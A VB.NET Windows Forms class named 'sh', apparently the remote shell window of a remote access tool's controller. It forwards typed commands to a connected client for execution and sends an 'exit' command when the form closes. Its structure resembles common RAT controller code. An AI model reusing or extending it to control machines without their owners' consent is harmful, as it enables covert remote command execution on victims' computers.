﻿Public Class sh
    Public U As USER

    Private Sub sh_KeyDown(ByVal sender As System.Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles TextBox2.KeyDown, RichTextBox1.KeyDown, MyBase.KeyDown
        Try
            If e.KeyCode = Keys.Enter Then
                If TextBox2.Text = "root@root >> ls" Then
                    Form1.S.Send(U, Form1.ENB("rs") & Form1.Y & Form1.ENB(TextBox2.Text.Replace("root@root >> ", "").Replace("ls", "dir")))
                ElseIf TextBox2.Text = "root@root >> clear" Then
                    Form1.S.Send(U, Form1.ENB("rs") & Form1.Y & Form1.ENB(TextBox2.Text.Replace("root@root >> ", "").Replace("clear", "cls")))
                Else
                    Form1.S.Send(U, Form1.ENB("rs") & Form1.Y & Form1.ENB(TextBox2.Text.Replace("root@root >> ", "")))
                End If
                If TextBox2.Text = "root@root >> clear" Or TextBox2.Text = "root@root >> cls" Then
                    RichTextBox1.Clear()
                End If
                TextBox2.Clear()
                TextBox2.AppendText("root@root >> ")
            End If
        Catch ex As Exception

        End Try

    End Sub
    Private Sub sh_FormClosing(ByVal sender As System.Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles MyBase.FormClosing
        Try
            Form1.S.Send(U, Form1.ENB("rs") & Form1.Y & Form1.ENB("exit"))
            TextBox2.Clear()
            Form1.S.Send(U, Form1.ENB("rsc"))
        Catch ex As Exception

        End Try

    End Sub

    Private Sub sh_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        TextBox2.AppendText("root@root >> ")
    End Sub

    Private Sub RichTextBox1_TextChanged(sender As Object, e As EventArgs) Handles RichTextBox1.TextChanged

    End Sub
End Class